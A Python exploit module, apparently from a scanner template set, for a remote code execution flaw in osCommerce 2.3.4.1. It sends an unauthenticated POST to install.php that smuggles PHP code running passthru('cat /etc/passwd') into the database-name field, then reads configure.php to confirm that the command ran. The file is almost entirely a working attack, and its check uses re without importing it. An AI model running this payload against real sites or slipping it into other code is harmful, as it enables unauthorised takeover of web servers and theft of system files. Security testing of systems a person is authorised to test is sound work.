import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''osCommerce 2.3.4.1 - Remote Code Execution''',
        "description": '''A vulnerability in osCommerce's install.php allows remote unauthenticated attackers to injecting PHP code into the db_database parameter, and subsequently use the configure.php page to to read the command's executed output''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/50128"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce", "oscommerce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/install/install.php?step=4"""
        method = "POST"
        data = """DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27cat+%2Fetc%2Fpasswd%27%29%3B%2F%2A"""
        headers = {'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/install/includes/configure.php"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0:""",resp1.text)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url